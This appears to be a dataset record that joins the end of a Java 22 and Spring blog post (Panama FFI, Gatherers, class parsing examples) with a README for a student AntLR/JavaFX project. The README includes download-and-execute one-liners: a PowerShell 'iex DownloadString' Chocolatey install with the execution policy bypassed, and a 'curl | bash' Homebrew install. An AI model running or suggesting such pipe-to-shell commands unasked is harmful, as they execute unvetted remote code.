            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.graalvm.buildtools</groupId>
                <artifactId>native-maven-plugin</artifactId>
                <version>0.10.1</version>
                <configuration>
                    <buildArgs>
                        <buildArg> --features=com.example.demo.DemoFeature</buildArg>
                        <buildArg> --enable-native-access=ALL-UNNAMED </buildArg>
                        <buildArg> -H:+ForeignAPISupport</buildArg>
                        <buildArg> -H:+UnlockExperimentalVMOptions</buildArg>
                        <buildArg> --enable-preview</buildArg>
                    </buildArgs>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-surefire-plugin</artifactId>
                <configuration>
                    <argLine>--enable-preview</argLine>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <enablePreview>true</enablePreview>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <configuration>
                    <compilerArguments> --enable-preview </compilerArguments>
                    <jvmArguments> --enable-preview</jvmArguments>
                </configuration>
            </plugin>
            <plugin>
			<groupId>io.spring.javaformat</groupId>
			<artifactId>spring-javaformat-maven-plugin</artifactId>
			<version>0.0.41</version>
			<executions>
				<execution>
					<phase>validate</phase>
					<inherited>true</inherited>
					<goals>
						<goal>validate</goal>
					</goals>
				</execution>
			</executions>
		</plugin>
        </plugins>
    </build>
    <repositories>
    <repository>
            <id>spring-milestones</id>
            <name>Spring Milestones</name>
            <url>https://repo.spring.io/milestone</url>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </repository>
        <repository>
            <id>spring-snapshots</id>
            <name>Spring Snapshots</name>
            <url>https://repo.spring.io/snapshot</url>
            <releases>
                <enabled>false</enabled>
            </releases>
        </repository>
    </repositories>
    <pluginRepositories>
        <pluginRepository>
            <id>spring-milestones</id>
            <name>Spring Milestones</name>
            <url>https://repo.spring.io/milestone</url>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </pluginRepository>
        <pluginRepository>
            <id>spring-snapshots</id>
            <name>Spring Snapshots</name>
            <url>https://repo.spring.io/snapshot</url>
            <releases>
                <enabled>false</enabled>
            </releases>
        </pluginRepository>
    </pluginRepositories>
</project>
```

I know, I know! There's a lot! But, not really. This `pom.xml` is almost identical to what I got from the Spring Initializr. The main changes are:

* I redefined the `maven-surefire-plugin` and `maven-compiler-plugin` to support preview features.
* I added the `spring-javaformat-maven-plugin` to support formatting my source code.
* I added two new dependencies: `org.graalvm.sdk:graal-sdk:23.1.2` and `org.graalvm.nativeimage:svm:23.1.2`, both of which are exclusively for the creation of the GraalVM `Feature` implementation that we will need later.
* I added configuration stanzas to the `<configuration>` sections of the `native-maven-plugin`, and the `spring-boot-maven-plugin`.

In no time at all, Spring Boot 3.3 will be GA and support Java 22, and so maybe half of this build file will disappear. (Talk about _Spring cleaning_!)

## A Quick Programming Note

Throughout this article, I'm going to refer to a functional interface type called `LanguageDemonstrationRunner`. It's just a functional interface I created that is declared to throw a `Throwable`, so that I don't have to worry about it. 

```java 
package com.example.demo;

@FunctionalInterface
interface LanguageDemonstrationRunner {

    void run() throws Throwable;

}
```

I have an `ApplicationRunner` which in turn injects all implementations of my functional interface and then invokes their `run` method, catching and handling `Throwable`. 


```java
    
    // ...	
    @Bean
	ApplicationRunner demo(Map<String, LanguageDemonstrationRunner> demos) {
		return _ -> demos.forEach((_, demo) -> {
			try {
				demo.run();
			} //
			catch (Throwable e) {
				throw new RuntimeException(e);
			}
		});
	}
    // ...
```

OK, that established.. onward!


## Bye, JNI!

This release sees the long-awaited release of [Project Panama](https://openjdk.org/projects/panama). This is one of the three features I've most been waiting for. The other two features, virtual threads and GraalVM native images, have been a reality for at least six months now.  Project Panama is  the thing that lets us leverage the galaxy of C, C++ code that's been so long denied us. Come to think of it, it probably supports  basically any kind of binary if it supports [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format), I'd imagine. Rust programs and Go programs can be compiled to C-compatible binaries, for example, so I imagine (but haven't tried) that this means easy enough interop with those languages, too. Broadly, in this section, when I talk about ""native code,"" I'm talking about binaries that are compiled in such a way that they can be invoked like a C library might.

Historically, Java has been very insular. It has _not_ been easy for Java developers to repurpose native C and C++ code. It makes sense. Native, operating system-specific code would only serve to undermine Java's promise of _Write Once, Run Anywhere_. It's always been a bit taboo. But I don't see why it should be.  To be fair, we've done alright, despite the absence of easy native code interop. There is [JNI](https://en.wikipedia.org/wiki/Java_Native_Interface), which stands for _Joylessly Navigating the Inferno_, I'm pretty sure. In order to use JNI, you must write more, _new_ C/C++ code to glue together whatever language you want to use with Java. (How is this productive? Who thought this was a good idea?) Most people _want_ to use JNI like they _want_ a root canal!  

Most people don't. We've simply had to reinvent everything in an idiomatic, Java-style way.  For nearly anything you could want to do, there is probably   a pure Java solution out there that runs anywhere Java does. It works fine  until  it doesn't. Java has missed out on key opportunities here. Imagine if Kubernetes had been built in Java? Imagine if the current AI revolution was powered by Java? There are a lot of reasons why these two notions would've been inconceivable when Numpy, Scipy, and Kubernetes were first created, but today? Today, they released Project Panama.

Project Panama introduces an easy way to link into native code. There are two levels of support. You can, in a rather low-level way, manipulate memory and pass data back and forth into native code. I said ""back and forth,"" but I probably should've said ""down and up"" to native code. Project Panama supports ""downcalls,"" calls into native code from Java, and ""upcalls,"" calls from native code into Java. You can invoke functions, allocate and free memory, read and update fields in `struct`s, etc.  

Let's take a look at a simple example. The code uses the new `java.lang.foreign.*` APIs to look up a symbol called `printf` (which is basically `System.out.print()`), allocate memory (sort of like `malloc`) buffer, and then pass that buffer to the `printf` function. 

```java

package com.example.demo;

import org.springframework.stereotype.Component;

import java.lang.foreign.Arena;
import java.lang.foreign.FunctionDescriptor;
import java.lang.foreign.Linker;
import java.lang.foreign.SymbolLookup;
import java.util.Objects;

import static java.lang.foreign.ValueLayout.ADDRESS;
import static java.lang.foreign.ValueLayout.JAVA_INT;

@Component
class ManualFfi implements LanguageDemonstrationRunner {

    // this is package private because we'll need it later
	static final FunctionDescriptor PRINTF_FUNCTION_DESCRIPTOR =
            FunctionDescriptor.of(JAVA_INT, ADDRESS);

	private final SymbolLookup symbolLookup;

    // SymbolLookup is a Panama API, but I have an implementation I'm injecting
	ManualFfi(SymbolLookup symbolLookup) {
		this.symbolLookup = symbolLookup;
	}

	@Override
	public void run() throws Throwable {
		var symbolName = ""printf"";
		var nativeLinker = Linker.nativeLinker();
		var methodHandle = this.symbolLookup.find(symbolName)
			.map(symbolSegment -> nativeLinker.downcallHandle(symbolSegment, PRINTF_FUNCTION_DESCRIPTOR))
			.orElse(null);
		try (var arena = Arena.ofConfined()) {
			var cString = arena.allocateFrom(""hello, Panama!"");
			Objects.requireNonNull(methodHandle).invoke(cString);
		}
	}

}
```

Here's the definition for the `SymbolLookup` that I put together. It is a sort of composite, trying one `SymbolLookup`,
and then another if the first should fail.

```java

@Bean
SymbolLookup symbolLookup() {
    var loaderLookup = SymbolLookup.loaderLookup();
    var stdlibLookup = Linker.nativeLinker().defaultLookup();
    return name -> loaderLookup.find(name).or(() -> stdlibLookup.find(name));
}
```

Run this, and you'll see it prints out `hello, Panama!`.

You might be wondering why I didn't pick something more interesting as an example. It turns out that there's precious
little that you can both take for granted across all operating systems _and_ perceive as having done something on your
computer. IO seemed to be about all I could think of, and console IO is even easier to follow.

But what about GraalVM native images? It doesn't support _every_ thing you might want to do. And, at least for the
moment, it doesn't run on Apple Silicon, only x86 chips. I developed this example and
set [up a GitHub Action](https://raw.githubusercontent.com/spring-tips/java22/main/.github/workflows/maven.yml) to see
the results in an x86 Linux environment. It's a bit of a pity for us Mac developers who are not using Intel chips, but
most of us aren't deploying to Apple devices in production, we're deploying to Linux and x86, so it's not a dealbreaker.

There are some
other [limitations, too](https://github.com/oracle/graal/blob/master/docs/reference-manual/native-image/ForeignInterface.md).
For example, GraalVM native images only support the first `SymbolLookup`, `loaderLookup`, in our composite. If that one
doesn't work, then neither of them will work.

GraalVM wants to know about some of the dynamic things you're going to do at runtime, including foreign function
invocation. You need to tell it ahead of time. For most other things about which it needs such information, like
reflection, serialization, resource loading, and more, you need to write a `.json` configuration file (or let Spring's
AOT engine write them for you). This feature is so new that you have to go down a few abstraction levels and write a
GraalVM `Feature` class. A `Feature`  has callback methods that get invoked during GraalVM's native compilation
lifecycle. You'll tell
GraalVM the signature, the _shape_, of the native function that we'll eventually invoke at runtime. Here's
the `Feature`.
There's only one line of value.

```java
package com.example.demo;

import org.graalvm.nativeimage.hosted.Feature;
import org.graalvm.nativeimage.hosted.RuntimeForeignAccess;

import static com.example.demo.ManualFfi.PRINTF_FUNCTION_DESCRIPTOR;

public class DemoFeature implements Feature {

	@Override
	public void duringSetup(DuringSetupAccess access) {
        // this is the only line that's important. NB: we're sharing 
        // the PRINTF_FUNCTION_DESCRIPTOR from our ManualFfi bean from earlier. 
		RuntimeForeignAccess.registerForDowncall(PRINTF_FUNCTION_DESCRIPTOR);
	}

}
```

And then we need to wire up the feature, telling GraalVM about it, by passing in the `--features` attribute to the GraalVM native image Maven plugin configuration. We also need to unlock the foreign API support and unlock experimental stuff. (I don't know why this is experimental in GraalVM native images when it's not experimental any longer in Java 22 itself). Also, we need to tell GraalVM to allow native access for all unnamed types. So, altogether, here's the final Maven plugin configuration.

```xml

<plugin>
    <groupId>org.graalvm.buildtools</groupId>
    <artifactId>native-maven-plugin</artifactId>
    <version>0.10.1</version>
    <configuration>
        <buildArgs>
            <buildArg>--features=com.example.demo.DemoFeature</buildArg>
            <buildArg>--enable-native-access=ALL-UNNAMED</buildArg>
            <buildArg>-H:+ForeignAPISupport</buildArg>
            <buildArg>-H:+UnlockExperimentalVMOptions</buildArg>
            <buildArg>--enable-preview</buildArg>
        </buildArgs>
    </configuration>
</plugin>
```

This is an awesome result. I compiled the code in this example into a GraalVM native image running on GitHub Actions
runners and then executed it. The application, which - I remind you - has the Spring JDBC support, a complete and
embedded SQL 99 compliant Java database called H2, and everything on the classpath - executes in 0.031 seconds (31
milliseconds, or 31 thousandths of a second), takes tens of megabytes of RAM, and invokes the native C code, from the
GraalVM native image!

I'm so happy, y'all. I've waited for this day for so long.

But this does feel a little low-level. At the end of the day, you are using a Java API to programmatically create and
maintain structures in native code. It's sort of like using SQL from JDBC. JDBC lets you manipulate SQL database records
in Java, but you're not writing SQL in Java and compiling it in Java and executing it in SQL. There's an abstraction
delta; you're sending strings into the SQL engine and then getting records back out as `ResultSet` objects. The same is
true for the low-level API in Panama. It works, but you're not invoking native code, your looking up symbols with
strings and manipulating memory.

So, they released a separate but related tool called `jextract`. You can point it at a C header file, like `stdio.h`, in
which the `printf` function is defined, and it'll generate Java code that mimics the call signature of the underlying C
code. I didn't use it in this example because the resulting Java code ends up being tied to the underlying platform. I
pointed it to `stdio.h` and got a lot of macOS specific definitions. I could hide all of that behind a runtime check for
the operating system and then dynamically load a particular implementation, but, eh, this blog's already too long. If
you want to see how to run `jextract`, here's the bash script I used that worked for macOS and Linux. Your mileage may
vary.

```bash
#!/usr/bin/env bash
LINUX=https://download.java.net/java/early_access/jextract/22/3/openjdk-22-jextract+3-13_linux-x64_bin.tar.gz
MACOS=https://download.java.net/java/early_access/jextract/22/3/openjdk-22-jextract+3-13_macos-x64_bin.tar.gz

OS=$(uname)

DL=""""
STDIO=""""

if [ ""$OS"" = ""Darwin"" ]; then
    DL=""$MACOS""
    STDIO=/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/stdio.h
elif [ ""$OS"" = ""Linux"" ]; then
    DL=$LINUX
    STDIO=/usr/include/stdio.h
else
    echo ""Are you running on Windows? This might work inside the Windows Subsystem for Linux, but I haven't tried it yet..""
fi

LOCAL_TGZ=tmp/jextract.tgz
REMOTE_TGZ=$DL
JEXTRACT_HOME=jextract-22

mkdir -p ""$(

 dirname  $LOCAL_TGZ )""
wget -O $LOCAL_TGZ $REMOTE_TGZ
tar -zxf ""$LOCAL_TGZ"" -C .
export PATH=$PATH:$JEXTRACT_HOME/bin

jextract  --output src/main/java  -t com.example.stdio $STDIO
```

Just think about it. We have easy foreign function interop, virtual threads giving us amazing scalability, and
statically linked, lightning fast, RAM efficient, self-contained GraalVM native image binaries. Tell me why you'd start
a new project in Go, again? :-)

## A Brave New World

Java 22 is an amazing new release. It brings with it a bevy of huge features and quality of life improvements. Just
remember, it can't always be this good! Nobody can introduce paradigm-changing new features consistently every six
months. It's just not possible. So, let's be thankful and enjoy it while we can, shall we? :) The last release, Java 21,
was, in my estimation, maybe the single biggest release I've seen since perhaps Java 5, maybe even earlier. It might be
the biggest ever!

There are a ton of features there that are well worth your attention, including _data-oriented programming_ and _virtual threads_.

I covered this, and a lot more, in a blog I did to support the release six months ago, [_Hello, Java 21_](https://spring.io/blog/2023/09/20/hello-java-21).

## Virtual Threads, Structured Concurrency, and Scoped Values

Virtual threads are the really important bit, though. Read the blog I just linked you to, towards the bottom. (Don't be
like [the Primeagen](https://www.youtube.com/watch?v=w87od6DjzAg), who read the article but managed to sort of move on
before even getting to the best part - the virtual threads! My friend... Why??)

Virtual threads are a way to squeeze more out of your cloud infrastructure spend, your hardware, etc., if you're running
IO-bound services. They make it so that you can take existing code written against the blocking IO APIs in `java.io`,
switch to virtual threads, and handle much better scale. The effect, usually, is that your system is no longer
constantly waiting for threads to be available so the average response time goes down, and, even nicer, you will see the
system handle many more requests at the same time! I can't stress this enough. Virtual threads are _awesome_! And if
you're using Spring Boot 3.2, you need only specify `spring.threads.virtual.enabled=true` to benefit from them!

Virtual threads are part of a slate of new features, which have been more than half a decade in coming, designed to make
Java the lean, mean scale machine we all knew it deserved to be. And it's working! Virtual threads was one of three
features, designed to work together. Virtual threads are the only feature that has been delivered in a release form, as
yet.

Structured concurrency and scoped values have both yet to land. Structured concurrency gives you a more elegant
programming model for building concurrent code, and scoped values give you an efficient and more versatile alternative
to `ThreadLocal<T>`, particularly useful in the context of virtual threads, where you can now realistically have
_millions_ of threads. Imagine having duplicated data for each of those!

These features are in preview in Java 22. I don't know that they're worth showing, just yet. Virtual threads are the magic piece, in my mind, and they are so magic precisely because you don't really need to know about them! Just set that one property, and you're off.

Virtual threads give you the amazing scale of something like `async`/`await` in Python, Rust, C#, TypeScript, JavaScript, or `suspend` in Kotlin, but without the inherent verbosity of code and busy work required to use those language features. It's one of the few times where, save for maybe Go's implementation, Java is just straight-up better in the result. Go's implementation is ideal, but only because they had this baked in to the 1.0 version. Indeed, Java's implementation is more remarkable precisely because it coexists with the older platform threads model.

## Implicitly Declared Classes and Instance Main Methods

This preview feature is huge quality-of-life win, even though the resulting code is smaller, and I warmly welcome it.
Unfortunately doesn't really work with Spring Boot, at the moment. The basic idea is that one day you'll be able to just
have a top-level main method, without all the ceremony inherent in Java today. Wouldn't this be nice as the entry point
to your application? No `class` definition, no `public static void`, no unneeded `String[]` args.

```java
void main() {
    System.out.println(""Hello, world!"");
}

```

## Statements Before Super

This is a nice quality of life feature. Basically, Java doesn't let you access `this` before invoking the super
constructor in a subclass. The goal was to avoid a class of bugs related to invalid state. But it's a bit heavy handed,
and forced developers to resort to `private static`  auxillary methods whenever they wanted to do any sort of
non-trivial computation before invoking the super method. Here's an example of the gymanastics sometimes required. I
stole this example from [the JEP](https://openjdk.org/jeps/447) page itself:

```java
class Sub extends Super {

    Sub(Certificate certificate) {
        super(prepareByteArray(certificate));
    }

    // Auxiliary method
    private static byte[] prepareByteArray(Certificate certificate) {
        var publicKey = certificate.getPublicKey();
        if (publicKey == null)
            throw new IllegalArgumentException(""null certificate"");
        return switch (publicKey) {
            case RSAKey rsaKey -> ///...
            case DSAPublicKey dsaKey -> ...
            //...
            default -> //...
        };
    }

}

```

You can see the problem. This new JEP, a preview feature for now, would allow you to inline that method in the
constructor itself, promoting readability and defeating code sprawl.

## Unnamed Variables and Patterns

Unnamed variables and patterns are another quality-of-life feature. This one, however, is already delivered.

When you're creating threads, or working with Java 8 streams and collectors, you're going to be creating lots of
lambdas. Indeed, there are plenty of situations in Spring where you'll be working with lambdas. Just think of all
the `*Template` objects, and their callback-centric methods. `JdbcClient` and `RowMapper<T>`, eh... _spring_ to mind,
too!

Fun fact: Lambdas were first introduced in 2014's Java 8 release. (Yes, that was a _decade_ ago! People were doing the
ice bucket challenges, the world was obsessed with selfie sticks, _Frozen_, and _Flappy Bird_.), but they had the
amazing quality that the almost 20 years of Java code that came before them could participate in lambdas overnight if
methods expected a single method interface implementation.

Lambdas are amazing. They introduce a new unit of reuse in the Java language. And the best part is that they were
designed in such a way as to sort of graft onto the existing rules of the runtime, including adapting so-called
_functional interfaces_ or SAMs (single abstract method) interfaces automatically to lambdas. My only complaint with
them is that it was annoying having to make things final that were referenced from within the lambda that belong to a
containing scope. That's since been fixed. And it is annoying having to spell out every parameter to a lambda even if I
have no intention of using it, and now, with Java 22, that too has been fixed! Here is a verbose example just to
demonstrate the use of the `_` character in two places. Because I can.

```java 
package com.example.demo;

import org.springframework.jdbc.core.simple.JdbcClient;
import org.springframework.stereotype.Component;

import javax.sql.DataSource;

@Component
class AnonymousLambdaParameters implements LanguageDemonstrationRunner {

	private final JdbcClient db;

	AnonymousLambdaParameters(DataSource db) {
		this.db = JdbcClient.create(db);
	}

	record Customer(Integer id, String name) {
	}

	@Override
	public void run() throws Throwable {
		var allCustomers = this.db.sql(""select * from customer "")
                // here! 
			.query((rs, _) -> new Customer(rs.getInt(""id""), rs.getString(""name"")))
			.list();
		System.out.println(""all: "" + allCustomers);
	}

}

```

That class uses Spring's `JdbcClient` to query the underlying database. It pages through the results, one by one, and
then involves our lambda, which conforms to the type `RowMapper<Customer>` to help in adapting our results into records
that line up with my domain model. The `RowMapper<T>` interface , to which our lambda conforms, has a single
method `T mapRow(ResultSet rs, int rowNum) throws SQLException` that expects two parameters: the `ResultSet`, which I'll
need, and the `rowNum`, which I'll almost never need. Now, thanks to Java 22, I don't need to specify it. Just plug
in `_`, like in Kotlin or TypeScript. Nice!

## Gatherers

Gatherers are another nice feature that is also in preview. You may know my
friend [Viktor Klang](https://twitter.com/viktorklang) from his amazing work
on  [Akka](https://doc.akka.io/docs/akka/current/typed/actors.html)  and for his contributions to Scala futures whilst
he was at Lightbend. These days, he's a Java language architect at Oracle, and one of the things he's been working on is
the new Gatherer API. The Stream API, which was also introduced in Java 8, by the way - gave Java developers a chance,
along with lambdas, to greatly simplify and modernize their existing code, and to move in a more
functional-programming-centric direction. It models a set of transformations on a stream of values. But, there are cracks in the abstraction. The Streams API has a number of very
convenient operators that work for 99% of the scenarios, but when you find something for which a convenient operator
doesn't exist, it can be frustrating because there was no easy way to plug one in. There have been countless proposals for new operator additions to the Streams API in
the intervening ten years, and there were even discussions and concessions made in the original proposal for lambdas
that the programming model be 
flexible [enough to support introducing new operators](https://cr.openjdk.org/~vklang/Gatherers.html). It's finally
arrived, albeit as a preview feature. Gatherers provide a slightly more low-level abstraction that gives you the ability to plug in all sorts of new
operations on Streams, without having to materialize the `Stream` as a `Collection` at any point. Here's an example I
stole directly, and unabashedly, [from Viktor and the team](https://docs.oracle.com/en/java/javase/22/docs/api/java.base/java/util/stream/Gatherer.html).

```java 
package com.example.demo;

import org.springframework.stereotype.Component;

import java.util.Locale;
import java.util.function.BiFunction;
import java.util.function.Supplier;
import java.util.stream.Gatherer;
import java.util.stream.Stream;

@Component
class Gatherers implements LanguageDemonstrationRunner {

    private static <T, R> Gatherer<T, ?, R> scan(
            Supplier<R> initial,
             BiFunction<? super R, ? super T, ? extends R> scanner) {

        class State {
            R current = initial.get();
        }
        return Gatherer.<T, State, R>ofSequential(State::new,
                Gatherer.Integrator.ofGreedy((state, element, downstream) -> {
                    state.current = scanner.apply(state.current, element);
                    return downstream.push(state.current);
                }));
    }

    @Override
    public void run() {
        var listOfNumberStrings = Stream
                .of(1, 2, 3, 4, 5, 6, 7, 8, 9)
                .gather(scan(() -> """", (string, number) -> string + number)
                        .andThen(java.util.stream.Gatherers.mapConcurrent(10, s -> s.toUpperCase(Locale.ROOT)))
                )
                .toList();
        System.out.println(listOfNumberStrings);
    }

}

```

The main thrust of that code is that there's a method here, `scan`, which returns an implementation of `Gatherer<T,?,R>`. Each `Gatherer<T,O,R>` expects an initializer and an integrator. It'll come with a default combiner and a default finisher, though you can override both. This implementation reads through all those number entries  and builds up a string for each entry that then accumulates after every successive string. The result is that you get `1`, then `12`, then `123`, then `1234`, etc.

The example above demonstrates that gatherers are also composable. We actually have two `Gatherer` in play: the one that does the scanning, and the one that maps every item to uppercase, and it does it concurrently.

Still don't quite understand? I get the feeling that's going to be okay. This is a bit in the weeds for most folks, I'd imagine. Most of us don't need to write our own Gatherers. But you _can_. My friend [Gunnar Morling](https://www.morling.dev/blog/zipping-gatherer/) did just that the other day, in fact. The genius of the Gatherers approach is that now the community can scratch its own itch. I wonder what this implies for awesome projects like Eclipse Collections or Apache Commons Collections or Guava? Will they ship Gatherers? What other projects might?   I'd love to see a lot of common sense gatherers, eh, well, _gathered_ into one place.

## Class Parsing API

Yet another really nice preview feature, this new addition to the JDK is really tuned to framework and infrastructure
folks. It answers questions like how do I build up a `.class` file, and how do I read a `.class` file? Right now the
market is saturated with good, albeit incompatible and alway, by definition, ever so slightly out of date options like
ASM (the 800 lb. gorilla in the space), ByteBuddy, CGLIB, etc. The JDK itself has three such solutions in its own
codebase! These sorts of libraries are everywhere, and critical for developers who are building frameworks like Spring
that generate classes at runtime to support your business logical. Think of this as a sort of reflection API, but
for `.class` files - the literal bytecode on the disk. Not an object loaded into the JVM.

Here's a trivial example that loads a `.class` file into a `byte[]` array and then introspects it.

```java

package com.example.demo;

import org.springframework.aot.hint.RuntimeHints;
import org.springframework.aot.hint.RuntimeHintsRegistrar;
import org.springframework.context.annotation.ImportRuntimeHints;
import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.Resource;
import org.springframework.stereotype.Component;

import java.lang.classfile.ClassFile;
import java.lang.classfile.FieldModel;
import java.lang.classfile.MethodModel;

@Component
@ImportRuntimeHints(ClassParsing.Hints.class)
class ClassParsing implements LanguageDemonstrationRunner {

    static class Hints implements RuntimeHintsRegistrar {

        @Override
        public void registerHints(RuntimeHints hints, ClassLoader classLoader) {
            hints.resources().registerResource(DEFAULT_CUSTOMER_SERVICE_CLASS);
        }

    }

    private final byte[] classFileBytes;

    private static final Resource DEFAULT_CUSTOMER_SERVICE_CLASS = new ClassPathResource(
            ""/simpleclassfile/DefaultCustomerService.class"");

    ClassParsing() throws Exception {
        this.classFileBytes = DEFAULT_CUSTOMER_SERVICE_CLASS.getContentAsByteArray();
    }

    @Override
    public void run() {
        // this is the important logic
        var classModel = ClassFile.of().parse(this.classFileBytes);
        for (var classElement : classModel) {
            switch (classElement) {
                case MethodModel mm -> System.out.printf(""Method %s%n"", mm.methodName().stringValue());
                case FieldModel fm -> System.out.printf(""Field %s%n"", fm.fieldName().stringValue());
                default -> {
                    // ... 
                }
            }
        }
    }

}

```

This example is made a bit more complicated because I am reading a resource at runtime, so I implemented a Spring
AOT `RuntimeHintsRegistrar` that results in a `.json` file with information about which resource I am reading,
the `DefaultCustomerService.class` file itself. Ignore all that. It's just for the GraalVM native image compilation.

The interesting bit is at the bottom, where we enumerate the `ClassElement` instances and then use some pattern matching
to tease out individual elements. Nice!

## String Templates

Yet another preview feature, String templates bring String interpolation to Java! We've had multiline Java `String`
values for a while. This new feature lets the language interpose variables available in scope in the compiled `String`
value. The best part? In theory, the mechanism itself is pluggable! Don't like this syntax? Write your own.

```java
package com.example.demo;

import org.springframework.stereotype.Component;

@Component
class StringTemplates implements LanguageDemonstrationRunner {

    @Override
    public void run() throws Throwable {
        var name = ""josh"";
        System.out.println(STR."""""" 
            name: \{name.toUpperCase()}
            """""");
    }

}
```

## Conclusion 

There's never been a better time to be a Java and Spring developer! I say it all the time. I feel like we're being given a brand new language and runtime, and it's being done - miraculously - in such a way as to not break backwards compatibility. This is one of the most ambitious software projects I've ever seen the Java community embark on, and we are lucky to be here to reap the rewards. I'll be using Java 22 and GraalVM support Java 22 for everything from now on, and I hope you will too. Thanks for reading along, and I hope if you liked it that you'll feel free to check out our Youtube channel where I will for sure [be covering more such features](https://bit.ly/spring-tips-playlist). ",0,0,1,0.0,"['hello', 'java', 'installation', 'you', 'get', 'ta', 'start', 'somewhere', 'a', 'quick', 'programming', 'note', 'bye', 'jni', 'a', 'brave', 'new', 'world', 'virtual', 'thread', 'structured', 'concurrency', 'scoped', 'value', 'implicitly', 'declared', 'class', 'instance', 'main', 'method', 'statement', 'before', 'super', 'unnamed', 'variable', 'pattern', 'gatherer', 'class', 'parsing', 'api', 'string', 'template', 'conclusion']","['a', 'class', 'hello', 'java', 'installation']",1.0,"[io.spring.javaformat:spring-javaformat-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
Dashstrom/tp-antlr,main,"# TP AntLR

Basic project for UV AI21 of [UTC](https://www.utc.fr/) using [Maven](https://maven.apache.org/), [AntLR](https://www.antlr.org/) and [JavaFX](https://openjfx.io/) (with [Visual Studio Code](https://code.visualstudio.com/)).

Be careful: **1 clone ğŸ“¦ = 1 star âœ¨**

## Download project

<details>
  <summary>With git</summary>

```bash
git clone https://github.com/Dashstrom/tp-antlr.git
cd tp-antlr
```

</details>

<details>
  <summary>Without git</summary>

[Download the ZIP](https://github.com/Dashstrom/tp-antlr/archive/refs/heads/main.zip)

</details>

## Tutorials

<details>
  <summary>Windows</summary>

### Windows: Install chocolatey and Java

âš ï¸ Open an admin shell with `windows + R -> ""powershell"" -> ctrl + shift + enter`.

Check if java is not already installed wih:

```powershell
java -version
```

This will display your java version, which must be at least 11. If this is not the case, uninstall java before continuing.

Output example of a java version lower than 11:

```text
java version ""1.8.0_291""
Java(TM) SE Runtime Environment (build 1.8.0_291-b10)
Java HotSpot(TM) 64-Bit Server VM (build 25.291-b10, mixed mode)
```

Output example if java is not installed:

```text
'java' is not recognized as an internal or external command, operable program or batch file.
```

After checking that your computer does not have java enter:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
choco install openjdk
```

### Windows: Retrieve sources for java-docs

âš ï¸ Re-open a shell in your project folder.

```powershell
./mvnw.cmd dependency:sources
```

### Windows: Compile and run

```powershell
./mvnw.cmd clean compile exec:java
```

### Windows: Build standalone JAR and EXE

```powershell
./mvnw.cmd clean package
```

The following warning can occur. You can ignore it.

```log
[WARNING] Failed to build parent project for org.openjfx:javafx-...:jar:17
```

</details>

<details>
  <summary>Ubuntu</summary>

### Ubuntu: Make Maven Wrapper executable

âš ï¸ Open a shell in your project folder.

```bash
chmod +x mvnw
```

### Ubuntu: Update and Install Java

```bash
sudo apt -y update && sudo apt -y install default-jdk
```

### Ubuntu: Retrieve sources for java-docs

```bash
./mvnw dependency:sources
```

### Ubuntu: Compile and run

```bash
./mvnw clean compile exec:java
```

### Ubuntu: Build standalone JAR and EXE

```bash
./mvnw clean package
```

The following warning can occur. You can ignore it.

```log
[WARNING] Failed to build parent project for org.openjfx:javafx-...:jar:17
```

</details>

<details>
  <summary>Mac</summary>

### Mac: Make Maven Wrapper executable

âš ï¸ Open a shell in your project folder.

```bash
chmod +x mvnw
```

### Mac: Install Homebrew and Java

```bash
/bin/bash -c ""$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""
echo ""export PATH=/opt/homebrew/bin:$PATH"" >> ~/.bash_profile && source ~/.bash_profile
brew install java
```

### Mac: Retrieve sources for java-docs

```bash
./mvnw dependency:sources
```

### Mac: Compile and run

```bash
./mvnw clean compile exec:java
```

### Mac: Build standalone JAR and EXE

```bash
./mvnw clean package
```

The following warning can occur. You can ignore it.

```log
[WARNING] Failed to build parent project for org.openjfx:javafx-...:jar:17
```

</details>

## Run standalone JAR

```bash
java -jar target/ai21-antlr-1.0-jar-with-dependencies.jar
```

The following warning can occur, and you can ignore it [see stackoverflow issue](https://stackoverflow.com/questions/67854139/javafx-warning-unsupported-javafx-configuration-classes-were-loaded-from-unna).

```log
... com.sun.javafx.application.PlatformImpl startup
AVERTISSEMENT: Unsupported JavaFX configuration: classes were loaded from 'unnamed module @...'
```

![GUI](sujets/gui.png)

## Development

Regenerate [Maven wrapper](https://maven.apache.org/wrapper/maven-wrapper-plugin/) (only if you know what you are doing).

```bash
mvn wrapper:wrapper -Dtype=script
```
